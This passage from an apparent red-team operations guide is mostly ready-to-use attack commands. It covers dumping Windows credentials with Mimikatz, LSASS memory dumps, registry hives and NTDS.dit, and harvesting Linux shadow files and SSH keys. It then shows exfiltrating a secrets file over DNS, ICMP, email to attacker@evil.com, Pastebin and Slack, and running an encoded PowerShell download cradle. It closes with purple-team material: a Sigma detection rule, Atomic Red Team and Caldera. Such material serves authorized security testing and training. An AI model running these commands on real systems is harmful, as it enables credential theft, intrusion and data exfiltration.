Obtaining credentials enables lateral movement, persistence, and access to additional resources.

### Windows Credential Dumping

**LSASS Memory**:
```bash
# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export

# Using procdump (less suspicious)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Transfer dump and analyze offline with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Using comsvcs.dll (built-in)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

**SAM and SYSTEM Hives**:
```bash
# Copy registry hives
reg save HKLM\SAM C:\temp\sam.save
reg save HKLM\SYSTEM C:\temp\system.save
reg save HKLM\SECURITY C:\temp\security.save

# Extract hashes
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

**NTDS.dit Extraction**:
```bash
# Method 1: Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit

# Method 2: ntdsutil
ntdsutil activate instance ntds
ntdsutil ifm
create full C:\temp\ntds_backup
quit
quit

# Extract hashes
python3 secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

**Cached Credentials**:
```bash
# Dump cached domain credentials
mimikatz # lsadump::cache

# Crack with hashcat
hashcat -m 2100 cached.txt wordlist.txt
```

### Linux Credential Access

**Password Files**:
```bash
# /etc/passwd and /etc/shadow
cat /etc/passwd
cat /etc/shadow

# Unshadow for cracking
unshadow passwd shadow > passwords.txt
john passwords.txt
hashcat -m 1800 passwords.txt wordlist.txt
```

**SSH Keys**:
```bash
# Find SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null

# Check for key permissions
ls -la ~/.ssh/

# Check authorized_keys for other users
find /home -name "authorized_keys" 2>/dev/null | xargs cat
```

**Memory Dumps**:
```bash
# Dump process memory
gcore <pid>

# Search for passwords
strings /proc/<pid>/environ | grep -i password
strings /proc/<pid>/cmdline

# Gnome Keyring
python3 pwnedkeys.py
```

---

## Data Exfiltration

Extracting data from the target environment while avoiding detection requires careful planning and execution.

### Covert Channels

**DNS Exfiltration**:
```bash
# Using dnsteal
python3 dnsteal.py 127.0.0.1 -z -s 20

# Client-side encoding
cat secret.txt | xxd -p | tr -d '\n' | fold -w 20 | while read line; do
    nslookup "$line.staging.target.com" done
```

**ICMP Exfiltration**:
```bash
# Using icmpsh
./icmpsh-m.py attacker-ip target-ip

# On target
icmpsh.exe -t attacker-ip -d 500 -b 30 -s 128
```

**Steganography**:
```bash
# Hide data in images
steghide embed -cf image.jpg -ef secret.txt -p password

# Extract
steghide extract -sf image.jpg -p password

# LSB steganography
stegpy image.jpg secret.txt
```

### Protocol Tunneling

**DNS Tunneling**:
```bash
# Iodine setup
# Server
iodined -f -c -P password 10.0.0.1 tunnel.domain.com

# Client
iodine -f -P password attacker-ip tunnel.domain.com
```

**ICMP Tunneling**:
```bash
# ptunnel setup
# Server
ptunnel -p 8080

# Client
ptunnel -p attacker-ip -lp 2222 -da target-internal -dp 22
ssh -p 2222 localhost
```

**SSH Tunneling**:
```bash
# Dynamic port forwarding
ssh -D 1080 user@pivot

# Local forwarding
ssh -L 445:target:445 user@pivot

# Remote forwarding
ssh -R 4444:localhost:4444 user@pivot

# SOCKS proxy chain
ssh -o ProxyCommand="ssh -W %%h:%%p user@pivot" user@target
```

### Legitimate Services

**Cloud Storage**:
```bash
# Exfiltrate via Dropbox
dropbox_uploader.sh upload secret.txt /

# Google Drive
gdrive upload secret.txt

# OneDrive
rclone copy secret.txt onedrive:
```

**Email**:
```bash
# Send via mail
mail -s "Data" -A secret.txt attacker@evil.com < /dev/null

# Using PowerShell
Send-MailMessage -To "attacker@evil.com" -From "internal@target.com" \
    -Subject "Report" -Attachments "C:\temp\secret.txt" -SmtpServer smtp.target.com
```

**Web Services**:
```bash
# Pastebin
curl -X POST -d "api_dev_key=KEY" -d "api_paste_code=$(cat secret.txt | base64)" \
    -d "api_option=paste" https://pastebin.com/api/api_post.php

# Slack webhook
curl -X POST -H 'Content-type: application/json' \
    --data '{"text":"'$(cat secret.txt | base64)'"}' \
    https://hooks.slack.com/services/TOKEN
```

---

## Purple Team Exercises

Purple team exercises combine red and blue team efforts to collaboratively improve security posture through real-time feedback and defense validation.

### Purple Team Methodology

**Planning Phase**:
```
1. Objective Definition
   - Specific TTPs to test
   - Detection goals
   - Expected outcomes
   
2. Scenario Design
   - Attack chain development
   - Timeline and milestones
   - Expected IOCs
   
3. Success Criteria
   - Detection rate
   - Response time
   - Alert quality
```

**Execution**:
```bash
# Simultaneous attack and defense validation
# Red team executes TTP
# Blue team validates detection and response
# Real-time feedback loop

# Example: Testing PowerShell logging
# Red executes encoded PowerShell
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAeQAuAHAAcwAxACcAKQA=

# Blue validates Script Block Logging
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104}
```

### Detection Engineering

**Sigma Rule Development**:
```yaml
title: Suspicious PowerShell Download
description: Detects suspicious PowerShell download commands
status: experimental
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - 'Invoke-Expression'
            - 'IEX'
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
    condition: selection
falsepositives:
    - Legitimate administrative scripts
level: high
```

**Atomic Red Team**:
```bash
# Install Atomic Red Team
Install-Module -Name invoke-atomicredteam -Scope CurrentUser

# Execute specific test
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Execute all tests for a technique
Invoke-AtomicTest T1059.001

# Get test details
Invoke-AtomicTest T1003.001 -ShowDetails
```

**Detection Validation**:
```bash
# Caldera framework for adversary emulation
git clone https://github.com/mitre/caldera.git
cd caldera
pip3 install -r requirements.txt
python3 server.py

# Access at http://localhost:8888
# Create adversary profiles
# Run operations against agents
```

### Metrics and Reporting

**Key Performance Indicators**:
```
Detection Metrics:
- Mean Time to Detect (MTTD)
- Alert True Positive Rate
- Coverage per MITRE ATT&CK technique
- Detection gaps by tactic

Response Metrics:
- Mean Time to Respond (MTTR)
- Playbook effectiveness
- Containment success rate
- Recovery time objectives
```

**Purple Team Report Template**:
```markdown
# Purple Team Exercise Report

## Executive Summary
- Exercise duration and scope
- Overall detection and response effectiveness
- Key findings and recommendations

## Test Scenarios
### Scenario 1: Initial Access via Phishing
- TTPs tested: T1566.001
- Execution status: Success/Fail
- Detection status: Detected/Missed
- Response time: X minutes
- Recommendations:

## Detection Gaps
- Missing telemetry sources
- Incomplete detection rules
- Visibility blind spots

## Improvements Implemented
- New detection rules
- Enhanced logging
- Process improvements

## Appendices
- Full TTP list
- Raw detection data
- IOCs generated
```

This comprehensive guide to Red Team operations and advanced adversary simulation provides security professionals with the methodologies, techniques, and tools necessary to conduct sophisticated security assessments. The evolving threat landscape requires continuous adaptation and learning to effectively test and improve organizational security postures.
